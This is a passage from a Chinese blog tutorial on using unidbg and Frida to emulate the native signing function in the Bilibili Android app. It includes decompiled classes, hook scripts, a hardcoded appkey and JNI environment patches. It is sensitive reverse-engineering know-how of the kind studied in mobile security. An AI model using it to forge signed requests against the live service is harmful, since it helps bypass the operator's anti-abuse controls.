      <url>/2025/07/08/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-四"><a href="#从实践中学习unidbg使用-四" class="headerlink" title="从实践中学习unidbg使用(四)"></a>从实践中学习unidbg使用(四)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇中的APK详见参考文章中</p><p>目标APK：bilibili.apk</p><p>目标方法实：libbili.so</p><h3 id="二、任务介绍"><a href="#二、任务介绍" class="headerlink" title="二、任务介绍"></a>二、任务介绍</h3><p><strong>JADX</strong>反编译.apk，找到<strong>com.bilibili.nativelibrary.LibBili</strong>类，其中的 s 方法是本篇的目标函数。它是一个静态方法，参数是Map，返回值是 SignedQuery 对象。</p><pre><code class="language-Java">package com.bilibili.nativelibrary;import androidx.annotation.NonNull;import com.bilibili.lib.media.resource.PlayIndex;import java.io.UnsupportedEncodingException;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.security.InvalidKeyException;import java.util.Arrays;import java.util.Map;import java.util.SortedMap;import java.util.TreeMap;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;/* compiled from: BL *//* loaded from: classes.dex */public final class LibBili &#123;    public static final int a = 0;    public static final int b = 1;    /* renamed from: c, reason: collision with root package name */    public static final int f14891c = 0;    public static final int d = 1;    public static final int e = 2;    public static final int f = 3;    /* compiled from: BL */    @Retention(RetentionPolicy.SOURCE)    /* loaded from: classes.dex */    public @interface a &#123;    &#125;    /* compiled from: BL */    @Retention(RetentionPolicy.SOURCE)    /* loaded from: classes.dex */    public @interface b &#123;    &#125;    static &#123;        com.getkeepsafe.relinker.c.c(PlayIndex.G);    &#125;    private static native String a(String str);    private static native String ao(String str, int i2, int i3);    private static native IvParameterSpec b(String str) throws InvalidKeyException;    public static byte[] b(String str, byte[] bArr) throws InvalidKeyException &#123;        try &#123;            byte[] bytes = str.getBytes(&quot;UTF-8&quot;);            return com.bilibili.nativelibrary.a.a(new SecretKeySpec(Arrays.copyOf(bytes, 16), &quot;AES&quot;), b(str), bArr);        &#125; catch (UnsupportedEncodingException | Exception unused) &#123;            return bArr;        &#125;    &#125;    public static byte[] c(String str, byte[] bArr) throws InvalidKeyException &#123;        try &#123;            byte[] bytes = str.getBytes(&quot;UTF-8&quot;);            return com.bilibili.nativelibrary.a.b(new SecretKeySpec(Arrays.copyOf(bytes, 16), &quot;AES&quot;), b(str), bArr);        &#125; catch (UnsupportedEncodingException | Exception unused) &#123;            return bArr;        &#125;    &#125;    @Deprecated    public static String d() &#123;        return e(&quot;android&quot;);    &#125;    public static String e(String str) &#123;        return a(str);    &#125;    public static String f(String str, int i2, int i3) &#123;        return ao(str, i2, i3);    &#125;    public static SignedQuery g(Map&lt;String, String&gt; map) &#123;        return s(map == null ? new TreeMap() : new TreeMap(map));    &#125;    public static native int getCpuCount();    @Deprecated    public static native int getCpuId();    public static SignedQuery h(Map&lt;String, String&gt; map, int i2, int i3) &#123;        TreeMap treeMap;        if (map == null) &#123;            treeMap = new TreeMap();        &#125; else &#123;            treeMap = new TreeMap(map);        &#125;        return so(treeMap, i2, i3);    &#125;    public static SignedQuery i(Map&lt;String, String&gt; map, @NonNull byte[] bArr) &#123;        TreeMap treeMap;        if (map == null) &#123;            treeMap = new TreeMap();        &#125; else &#123;            treeMap = new TreeMap(map);        &#125;        return so(treeMap, bArr);    &#125;    static native SignedQuery s(SortedMap&lt;String, String&gt; sortedMap);    static native SignedQuery so(SortedMap&lt;String, String&gt; sortedMap, int i2, int i3);    static native SignedQuery so(SortedMap&lt;String, String&gt; sortedMap, byte[] bArr);&#125;</code></pre><p>该类是样本应用中的一个JNI桥接类，主要作用是为Java层提供对native层加密&#x2F;签名&#x2F;系统信息处理等能力的访问。</p><p>而我们的目标函数在LibBili类里的g函数使用了它。</p><pre><code class="language-Java">public static SignedQuery g(Map&lt;String, String&gt; map) &#123;return s(map == null ? new TreeMap() : new TreeMap(map));&#125;</code></pre><p>对 g 方法做hook，参考代码如下</p><pre><code class="language-js">function hookS() &#123;    setTimeout(function () &#123;        Java.perform(function () &#123;            let LibBili = Java.use(&quot;com.bilibili.nativelibrary.LibBili&quot;);            let Map = Java.use(&quot;java.util.HashMap&quot;);                        LibBili[&quot;g&quot;].implementation = function (map) &#123;                console.log(&#39;g is called&#39; + &#39; map: &#39; + Java.cast(map, Map));                let ret = this.g(map);                console.log(&#39;g ret value is &#39; + ret + &#39;\n&#39;);                return ret;            &#125;;        &#125;);    &#125;, 3000);&#125;hookS();</code></pre><p>输出有很多，随便取一条</p><pre><code class="language-shell">g is called map: &#123;build=6180500, mobi_app=android, channel=shenma069, actionKey=appkey, appkey=1d8b6e7d45233436, s_locale=zh_CN, c_locale=zh_CN, device=android, hash=97fa29af-c53f-0712-1701-5271-ac82-ba11-8af1-6e8a-943b-5e5b, platform=android, statistics=&#123;&quot;appId&quot;:1,&quot;platform&quot;:3,&quot;version&quot;:&quot;6.18.0&quot;,&quot;abtest&quot;:&quot;&quot;&#125;&#125;g ret value is actionKey=appkey&amp;appkey=1d8b6e7d45233436&amp;build=6180500&amp;c_locale=zh_CN&amp;channel=shenma069&amp;device=android&amp;hash=97fa29af-c53f-0712-1701-5271-ac82-ba11-8af1-6e8a-943b-5e5b&amp;mobi_app=android&amp;platform=android&amp;s_locale=zh_CN&amp;statistics=%7B%22appId%22%3A1%2C%22platform%22%3A3%2C%22version%22%3A%226.18.0%22%2C%22abtest%22%3A%22%22%7D&amp;ts=1752200177&amp;sign=19d4104c2956d248dc02fb12b8c076de</code></pre><p>返回值是SignedQuery对象，打印发现直接返回了字符串，这是因为SignedQuery里重写了toString方法，如下所示：</p><pre><code class="language-Java">package com.bilibili.nativelibrary;import android.text.TextUtils;import com.huawei.hms.framework.common.ContainerUtils;import java.io.UnsupportedEncodingException;import java.util.Map;import java.util.SortedMap;import java.util.TreeMap;import u.aly.cv;public final class SignedQuery &#123;    private static final char[] f14891c = &quot;0123456789ABCDEF&quot;.toCharArray();    public final String a;    public final String b;    public SignedQuery(String str, String str2) &#123;        this.a = str;        this.b = str2;    &#125;    public String toString() &#123;        String str = this.a;        if (str == null) &#123;            return &quot;&quot;;        &#125;        if (this.b == null) &#123;            return str;        &#125;        return this.a + &quot;&amp;sign=&quot; + this.b;    &#125;&#125;</code></pre><p>使用Frida Call主动调用一下</p><pre><code class="language-js">function callS() &#123;        Java.perform(function () &#123;            let LibBili = Java.use(&quot;com.bilibili.nativelibrary.LibBili&quot;);            let TreeMap = Java.use(&quot;java.util.TreeMap&quot;);var map = TreeMap.$new();                        map.put(&quot;build&quot;, &quot;6180500&quot;);map.put(&quot;mobi_app&quot;, &quot;android&quot;);map.put(&quot;channel&quot;, &quot;shenma069&quot;);map.put(&quot;appkey&quot;, &quot;1d8b6e7d45233436&quot;);map.put(&quot;s_locale&quot;, &quot;zh_CN&quot;);let result = LibBili.s(map);console.log(&quot;ret: &quot; + result);        &#125;);&#125;callS();</code></pre><p>其中map的键值对可以多一些也可以少一些。然后经过多次调用</p><pre><code class="language-shell">ret: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752201522&amp;sign=34bd4782c3ac27818b28140f10acdfe7ret: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=android&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752201525&amp;sign=08a09f59ffa5622895206c837947444cret: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=android&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752201526&amp;sign=0c769ea4759665c8fac80c8fd49f0f12ret: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=android&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752201529&amp;sign=04e9de2cba349039d74cdb65c0f643adret: appkey=1d8b6e7d45233436&amp;build=6180500&amp;channel=shenma069&amp;device=android&amp;mobi_app=android&amp;s_locale=zh_CN&amp;ts=1752201530&amp;sign=ea183695d071bbda958745a20d09e9ed</code></pre><p>可以观察到，返回的值由八个键值对组成，六个来自输入，ts是时间戳，还有一个就是sign。本篇的目标就是使用Unidbg复现对sign的调用。</p><h3 id="三、初始化"><a href="#三、初始化" class="headerlink" title="三、初始化"></a>三、初始化</h3><p>初始化代码如下</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST3 extends AbstractJni implements IOResolver&lt;AndroidFileIO&gt; &#123;    private final AndroidEmulator emulator;    private final DvmClass LibBili;    private final VM vm;    public TEST3() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;tv.danmaku.bili&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test3\\bilibili.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        emulator.getSyscallHandler().addIOResolver(this);        //加载Dalvik的模块        DalvikModule dm = vm.loadLibrary(&quot;bili&quot;, true);        //加载目标类        LibBili = vm.resolveClass(&quot;com.bilibili.nativelibrary.LibBili&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST3 test3 = new TEST3();    &#125;    @Override    public FileResult resolve(Emulator emulator, String pathname, int oflags) &#123;        System.out.println(&quot;lilac open: &quot; + pathname);        return null;    &#125;&#125;</code></pre><p>因为担心可能存在文件访问，所以这里继承了 IOResolver，补文件访问的相关处理见 《补文件访问》专题的相关文章。</p><p>运行代码，发现并没有像参考文章中报错，但是如果加了多线程处理的逻辑，输出会有变化。</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST3 extends AbstractJni implements IOResolver&lt;AndroidFileIO&gt; &#123;    private final AndroidEmulator emulator;    private final DvmClass LibBili;    private final VM vm;    public TEST3() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;tv.danmaku.bili&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test3\\bilibili.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        // add        emulator.getBackend().registerEmuCountHook(10000); // 设置执行多少条指令切换一次线程        emulator.getSyscallHandler().setVerbose(true);        emulator.getSyscallHandler().setEnableThreadDispatcher(true);        emulator.getSyscallHandler().addIOResolver(this);        //加载Dalvik的模块        DalvikModule dm = vm.loadLibrary(&quot;bili&quot;, true);        //加载目标类        LibBili = vm.resolveClass(&quot;com.bilibili.nativelibrary.LibBili&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST3 test3 = new TEST3();    &#125;    @Override    public FileResult resolve(Emulator emulator, String pathname, int oflags) &#123;        System.out.println(&quot;lilac open: &quot; + pathname);        return null;    &#125;&#125;</code></pre><p>参考文章中的报错试因为，如果样本调用了多线程创建函数 <strong>pthread_create</strong>，但Unidbg未开启多线程处理逻辑，就会报这个错，所以需要开启多线程逻辑。代码如上。</p><p>而这个报错背后的逻辑，是因为样本在调用 <strong>pthread_create</strong> 创建线程时，最终会走到clone系统调用，在Unidbg中对应于 <strong>bionic_clone</strong> 函数，对应于下面的逻辑</p><pre><code class="language-Java">if (threadDispatcherEnabled) &#123;    if (verbose) &#123;        System.out.printf(&quot;bionic_clone fn=%s%n&quot;, fn);    &#125;    emulator.getThreadDispatcher().addThread(new MarshmallowThread(emulator, fn, arg, ctid, threadId));    ctid.setInt(0, threadId);    return threadId;&#125;emulator.getMemory().setErrno(UnixEmulator.ENOMEM);return -UnixEmulator.ENOMEM;</code></pre><p>即如果打开了多线程，就添加新线程，进入调度逻辑，否则就设置错误码为 <strong>ENOMEM</strong> ，它进而导致 <strong>Out of memory</strong> 的报错，提醒我们开启多线程处理逻辑。</p><pre><code class="language-Java">public interface UnixEmulator &#123;    int EPERM = 1; /* Operation not permitted */    int ENOENT = 2; /* No such file or directory */    int ESRCH = 3; /* No such process */    int EINTR = 4; /* Interrupted system call */    int EBADF = 9; /* Bad file descriptor */    int EAGAIN = 11; /* Resource temporarily unavailable */    int ENOMEM = 12; /* Cannot allocate memory */    int EACCES = 13; /* Permission denied */    int EFAULT = 14; /* Bad address */    int EEXIST = 17; /* File exists */    int ENOTDIR = 20; /* Not a directory */    int EINVAL = 22; /* Invalid argument */    int ENOTTY = 25; /* Inappropriate ioctl for device */    int ENOSYS = 38; /* Function not implemented */    int ENOATTR = 93; /* Attribute not found */    int EOPNOTSUPP = 95; /* Operation not supported on transport endpoint */    int EAFNOSUPPORT = 97; /* Address family not supported by protocol family */    int EADDRINUSE = 98; /* Address already in use */    int ECONNREFUSED = 111; /* Connection refused */&#125;</code></pre><p>言归正传，继续运行，依然没有报错，Unidbg的日志输出中可以看到 s 方法，它来自于动态注册。</p><p><strong>(Ljava&#x2F;util&#x2F;SortedMap;)Lcom&#x2F;bilibili&#x2F;nativelibrary&#x2F;SignedQuery;</strong>  就是待会调用它的签名。</p><pre><code class="language-shell">JNIEnv-&gt;RegisterNatives(com/bilibili/nativelibrary/LibBili, RW@0x1200b004[libbili.so]0xb004, 8) was called from RX@0x12001b8f[libbili.so]0x1b8fRegisterNative(com/bilibili/nativelibrary/LibBili, a(Ljava/lang/String;)Ljava/lang/String;, RX@0x12001c7d[libbili.so]0x1c7d)RegisterNative(com/bilibili/nativelibrary/LibBili, ao(Ljava/lang/String;II)Ljava/lang/String;, RX@0x12001c83[libbili.so]0x1c83)RegisterNative(com/bilibili/nativelibrary/LibBili, b(Ljava/lang/String;)Ljavax/crypto/spec/IvParameterSpec;, RX@0x12001c91[libbili.so]0x1c91)RegisterNative(com/bilibili/nativelibrary/LibBili, s(Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery;, RX@0x12001c97[libbili.so]0x1c97)RegisterNative(com/bilibili/nativelibrary/LibBili, so(Ljava/util/SortedMap;II)Lcom/bilibili/nativelibrary/SignedQuery;, RX@0x12001c9d[libbili.so]0x1c9d)RegisterNative(com/bilibili/nativelibrary/LibBili, so(Ljava/util/SortedMap;[B)Lcom/bilibili/nativelibrary/SignedQuery;, RX@0x12001cab[libbili.so]0x1cab)RegisterNative(com/bilibili/nativelibrary/LibBili, getCpuCount()I, RX@0x12001cb3[libbili.so]0x1cb3)RegisterNative(com/bilibili/nativelibrary/LibBili, getCpuId()I, RX@0x12001cb7[libbili.so]0x1cb7)</code></pre><h3 id="四、发起调用"><a href="#四、发起调用" class="headerlink" title="四、发起调用"></a>四、发起调用</h3><p>我们前面的例子里，参数和返回值都是基本类型、字符串、字节数组，直接传入就可以调用<br>而这里比较特殊，是个map，读者可能也想到这样调用</p><pre><code class="language-Java">public String callS()&#123;    TreeMap&lt;String, String&gt; map = new TreeMap&lt;&gt;();    map.put(&quot;build&quot;, &quot;6180500&quot;);    map.put(&quot;mobi_app&quot;, &quot;android&quot;);    map.put(&quot;channel&quot;, &quot;shenma069&quot;);    map.put(&quot;appkey&quot;, &quot;1d8b6e7d45233436&quot;);    map.put(&quot;s_locale&quot;, &quot;zh_CN&quot;);    map.put(&quot;device&quot;, &quot;android&quot;);    String ret = LibBili.callStaticJniMethodObject(emulator, &quot;s(Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery;&quot;, map).getValue().toString();    return ret;&#125;</code></pre><p>运行发现报错 Unsupported arg</p><pre><code class="language-Java">Exception in thread &quot;main&quot; java.lang.IllegalStateException: Unsupported arg: &#123;appkey=1d8b6e7d45233436, build=6180500, channel=shenma069, device=android, mobi_app=android, s_locale=zh_CN&#125;at com.github.unidbg.Module.emulateFunction(Module.java:160)at com.github.unidbg.linux.android.dvm.DvmObject.callJniMethod(DvmObject.java:135)at com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(DvmClass.java:316)at com.test3.TEST3.callS(TEST3.java:69)at com.test3.TEST3.main(TEST3.java:52)</code></pre><p>接下里完整地学习一下 Unidbg 中JNI对象的方法，</p><p>首先根据 <strong>JNI</strong> 标准，<strong>JNI</strong> 方法的返回值，以及 JAVA 传递到 <strong>Native</strong> 的对象，都是 <strong>JObject</strong> ，其中最常用的一些类还做了细分，具体情况如下。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250712113706002.png" alt="image-20250712113706002"></p><p>jclass是类对象，jstring 是字符串，jarray 以及其他细分是各种各样的数组， jthrowable 是 JNI 异常处理中使用到的对象。</p><p>在Unidbg中，做了几乎完整的等价模拟和映射。</p><ul><li>jobject 对应于 DvmOgject</li><li>jclass 对应于 DvmClass</li><li>jstring 对应于 StringObject</li><li>jarray 对应于 BaseArray</li><li>jobjectArray 对应于 ByteArray</li><li>jshortArray 对应于 ShortArray</li><li>jintArray 对应于 IntArray</li></ul><p>在补 JNI 调用时，如果返回值是String，需要封装为 StringObject ，比如前文就有一个片段，返回了字符串。</p><pre><code class="language-Java">case &quot;java/lang/Class-&gt;getSimpleName()Ljava/lang/String;&quot;:&#123;    String className = ((DvmClass) dvmObject).getClassName();    String[] name = className.split(&quot;/&quot;);    return new StringObject(vm, name[name.length - 1]);&#125;</code></pre><p>在函数调用时，为什么字符串、字节数组这样的对象，我们不需要用<strong>StringObject</strong> 以及 <strong>ByteArray</strong> 包装？</p><p><strong>callXXX</strong> 系列方法内部调用了 <strong>callJniMethod</strong> 方法，不妨解析一下这个代码。</p><pre><code class="language-Java">protected static Number callJniMethod(Emulator&lt;?&gt; emulator, VM vm, DvmClass objectType, DvmObject&lt;?&gt; thisObj, String method, Object...args) &#123;    UnidbgPointer fnPtr = objectType.findNativeFunction(emulator, method);    vm.addLocalObject(thisObj);    List&lt;Object&gt; list = new ArrayList&lt;&gt;(10);    list.add(vm.getJNIEnv());    list.add(thisObj.hashCode());    if (args != null) &#123;        for (Object arg : args) &#123;            if (arg instanceof Boolean) &#123;                list.add((Boolean) arg ? VM.JNI_TRUE : VM.JNI_FALSE);                continue;            &#125; else if(arg instanceof Hashable) &#123;                list.add(arg.hashCode()); // dvm object                if(arg instanceof DvmObject) &#123;                    vm.addLocalObject((DvmObject&lt;?&gt;) arg);                &#125;                continue;            &#125; else if (arg instanceof DvmAwareObject ||                    arg instanceof String ||                    arg instanceof byte[] ||                    arg instanceof short[] ||                    arg instanceof int[] ||                    arg instanceof float[] ||                    arg instanceof double[] ||                    arg instanceof Enum) &#123;                DvmObject&lt;?&gt; obj = ProxyDvmObject.createObject(vm, arg);                list.add(obj.hashCode());                vm.addLocalObject(obj);                continue;            &#125;            list.add(arg);        &#125;    &#125;    return Module.emulateFunction(emulator, fnPtr.peer, list.toArray());&#125;</code></pre><p>它首先根据方法签名找到对应的函数地址，这个逻辑在 findNativeFunction里。</p><pre><code class="language-Java">UnidbgPointer fnPtr = objectType.findNativeFunction(emulator, method);</code></pre><p>接着开始处理函数参数，首先添加 JNIEnv、Jobject&#x2F;Jclass 作为第一、二个参数，这是 JNI 规范的默认要求。</p><pre><code class="language-Java">List&lt;Object&gt; list = new ArrayList&lt;&gt;(10);list.add(vm.getJNIEnv());list.add(thisObj.hashCode());</code></pre><p>然后处理函数自己的入参</p><pre><code class="language-Java">if (args != null) &#123;    for (Object arg : args) &#123;        if (arg instanceof Boolean) &#123;            list.add((Boolean) arg ? VM.JNI_TRUE : VM.JNI_FALSE);            continue;        &#125; else if(arg instanceof Hashable) &#123;            list.add(arg.hashCode()); // dvm object            if(arg instanceof DvmObject) &#123;                vm.addLocalObject((DvmObject&lt;?&gt;) arg);            &#125;            continue;        &#125; else if (arg instanceof DvmAwareObject ||                arg instanceof String ||                arg instanceof byte[] ||                arg instanceof short[] ||                arg instanceof int[] ||                arg instanceof float[] ||                arg instanceof double[] ||                arg instanceof Enum) &#123;            DvmObject&lt;?&gt; obj = ProxyDvmObject.createObject(vm, arg);            list.add(obj.hashCode());            vm.addLocalObject(obj);            continue;        &#125;        list.add(arg);    &#125;&#125;</code></pre><p>其中包含 Boolean 转为 01，添加局部引用，判断是否已经是 <strong>DvmObject</strong> 等一系列逻辑，再下面就是对常见类型的包装，如果用户传入 String 、byteArray等类型，会通过 <strong>ProxyDvmObject.createObject</strong> 自动装箱为 Unidbg JNI 中对应的类型。我们注意到， <strong>callJniMethod</strong> 没有处理参数是Map 的情况，所以没能经过自动装箱。</p><pre><code class="language-Java">public static DvmObject&lt;?&gt; createObject(VM vm, Object value) &#123;    if (value == null) &#123;        return null;    &#125;    if (value instanceof Class&lt;?&gt;) &#123;        return getObjectType(vm, (Class&lt;?&gt;) value);    &#125;    if (value instanceof DvmObject) &#123;        return (DvmObject&lt;?&gt;) value;    &#125;    if (value instanceof byte[]) &#123;        return new ByteArray(vm, (byte[]) value);    &#125;    if (value instanceof short[]) &#123;        return new ShortArray(vm, (short[]) value);    &#125;    if (value instanceof int[]) &#123;        return new IntArray(vm, (int[]) value);    &#125;    if (value instanceof float[]) &#123;        return new FloatArray(vm, (float[]) value);    &#125;    if (value instanceof double[]) &#123;        return new DoubleArray(vm, (double[]) value);    &#125;    if (value instanceof String) &#123;        return new StringObject(vm, (String) value);    &#125;    Class&lt;?&gt; clazz = value.getClass();    if (clazz.isArray()) &#123;        if (clazz.getComponentType().isPrimitive()) &#123;            throw new UnsupportedOperationException(String.valueOf(value));        &#125;        Object[] array = (Object[]) value;        DvmObject&lt;?&gt;[] dvmArray = new DvmObject[array.length];        for (int i = 0; i &lt; array.length; i++) &#123;            dvmArray[i] = createObject(vm, array[i]);        &#125;        return new ArrayObject(dvmArray);    &#125;    return new ProxyDvmObject(vm, value);&#125;</code></pre><p>但事实上， <strong>createObject</strong> 除了可以处理 String、array这样的普通对象，也可以处理 map 或其他对象类型。来看 <strong>ProxyDvmObject</strong> 对象的构造逻辑，它会对类的父类以及接口类做解析，嵌套式的<strong>getObjectType</strong>，最后 <strong>resolveClass</strong> 再 <strong>newObject</strong> 得到最终的 <strong>DvmObject</strong>。</p><pre><code class="language-Java">private ProxyDvmObject(VM vm, Object value) &#123;    super(getObjectType(vm, value.getClass()), value);&#125;private static DvmClass getObjectType(VM vm, Class&lt;?&gt; clazz) &#123;    Class&lt;?&gt; superClass = clazz.getSuperclass();    DvmClass[] interfaces = new DvmClass[clazz.getInterfaces().length + (superClass == null ? 0 : 1)];    int i = 0;    if (superClass != null) &#123;        interfaces[i++] = getObjectType(vm, superClass);    &#125;    for (Class&lt;?&gt; cc : clazz.getInterfaces()) &#123;        interfaces[i++] = getObjectType(vm, cc);    &#125;    return vm.resolveClass(clazz.getName().replace(&#39;.&#39;, &#39;/&#39;), interfaces);&#125;</code></pre><p>因此我们手动调用它处理 map</p><pre><code class="language-Java">public String callS()&#123;    TreeMap&lt;String, String&gt; map = new TreeMap&lt;&gt;();    map.put(&quot;build&quot;, &quot;6180500&quot;);    map.put(&quot;mobi_app&quot;, &quot;android&quot;);    map.put(&quot;channel&quot;, &quot;shenma069&quot;);    map.put(&quot;appkey&quot;, &quot;1d8b6e7d45233436&quot;);    map.put(&quot;s_locale&quot;, &quot;zh_CN&quot;);    DvmObject&lt;?&gt; mapObject = ProxyDvmObject.createObject(vm, map);    String ret = LibBili.callStaticJniMethodObject(emulator, &quot;s(Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery;&quot;, mapObject).getValue().toString();    return ret;&#125;</code></pre><p>不妨总结一下补 JNI 的形式要求</p><ul><li>基本类型直接传递</li><li>字符串、字节数组等基本对象直接传递，其内部会做封装，也可以自己调用 <strong>new StringObject(vm, str)</strong>、**new ByteArray(vm, value)**等。</li><li>JDK 标准库对象，如 HashMap、JsonObject 等，使用 <strong>ProxyDvmObject.createObject(vm, value)</strong> 处理。</li><li>非 JDK 标准对象，如 Android Context、SharedPreference 等，使用 <strong>vm.resolveClass(vm, className).newObject(vlaue)</strong> 处理。</li></ul><p>接下来按照这样的形式要求去实践补环境</p><h3 id="五、补环境"><a href="#五、补环境" class="headerlink" title="五、补环境"></a>五、补环境</h3><p>运行报错</p><pre><code class="language-shell">[13:30:16 216]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x12001c97[libbili.so]0x1c97 exception sp=unidbg@0xe4fff648, msg=java/util/Map-&gt;isEmpty()Z, offset=9ms @ Runnable|Function32 address=0x12001c97, arguments=[unidbg@0xfffe12a0, -288775324, 2100961961]Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;com.github.unidbg.linux.android.dvm.DvmObject.getValue()&quot; because the return value of &quot;com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(com.github.unidbg.Emulator, String, Object[])&quot; is nullat com.test3.TEST3.callS(TEST3.java:68)at com.test3.TEST3.main(TEST3.java:50)</code></pre><p>isEmpty 用于判断 Map 是否为空，取出这个 dvmObject 对应的 map 对象，调用它的 isEmpty 方法。</p><pre><code class="language-Java">@Overridepublic boolean callBooleanMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;    switch (signature)&#123;        case &quot;java/util/Map-&gt;isEmpty()Z&quot;:&#123;            Map map = (Map) dvmObject.getValue();            return map.isEmpty();        &#125;    &#125;    return super.callBooleanMethod(vm, dvmObject, signature, varArg);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">[13:48:32 772]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x12001c97[libbili.so]0x1c97 exception sp=unidbg@0xe4fff648, msg=java/util/Map-&gt;get(Ljava/lang/Object;)Ljava/lang/Object;, offset=8ms @ Runnable|Function32 address=0x12001c97, arguments=[unidbg@0xfffe12a0, -288775324, 2100961961]Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;com.github.unidbg.linux.android.dvm.DvmObject.getValue()&quot; because the return value of &quot;com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(com.github.unidbg.Emulator, String, Object[])&quot; is nullat com.test3.TEST3.callS(TEST3.java:69)at com.test3.TEST3.main(TEST3.java:51)</code></pre><p>同样实现它。不以 <strong>V</strong> 结尾的 JNI 函数通过varArg 取参数，以 <strong>V</strong> 结尾的 JNI 函数中通过carList取参数。</p><p>getObjectArg(index) 用于获取第 <strong>index</strong> 个 <strong>object</strong> 参数，如果是 int、long 等类型需要使用对应的 <strong>getintArg</strong> 、<strong>getlongArg</strong> 等等。</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;    switch (signature)&#123;        case &quot;java/util/Map-&gt;get(Ljava/lang/Object;)Ljava/lang/Object;&quot;:&#123;            Map map = (Map) dvmObject.getValue();            // 不要忘了getvalue            Object key = varArg.getObjectArg(0).getValue();            return ProxyDvmObject.createObject(vm, map.get(key));        &#125;    &#125;    return super.callObjectMethod(vm, dvmObject, signature, varArg);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">[14:07:40 615]  WARN [com.github.unidbg.AbstractEmulator] (AbstractEmulator:417) - emulate RX@0x12001c97[libbili.so]0x1c97 exception sp=unidbg@0xe4fff610, msg=java/util/Map-&gt;put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;, offset=23ms @ Runnable|Function32 address=0x12001c97, arguments=[unidbg@0xfffe12a0, -288775324, 2100961961]Exception in thread &quot;main&quot; java.lang.NullPointerException: Cannot invoke &quot;com.github.unidbg.linux.android.dvm.DvmObject.getValue()&quot; because the return value of &quot;com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(com.github.unidbg.Emulator, String, Object[])&quot; is nullat com.test3.TEST3.callS(TEST3.java:69)at com.test3.TEST3.main(TEST3.java:51)</code></pre><p>同样还是实现它</p><pre><code class="language-Java">case &quot;java/util/Map-&gt;put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;&quot;:&#123;    Map map = (Map) dvmObject.getValue();    Object key = varArg.getObjectArg(0).getValue();    Object value = varArg.getObjectArg(1).getValue();    return ProxyDvmObject.createObject(vm, map.put(key, value));&#125;</code></pre><p>继续运行，这次报错比较特殊</p><pre><code class="language-shell">[14:18:20 309]  WARN [com.github.unidbg.AbstractEmulator] 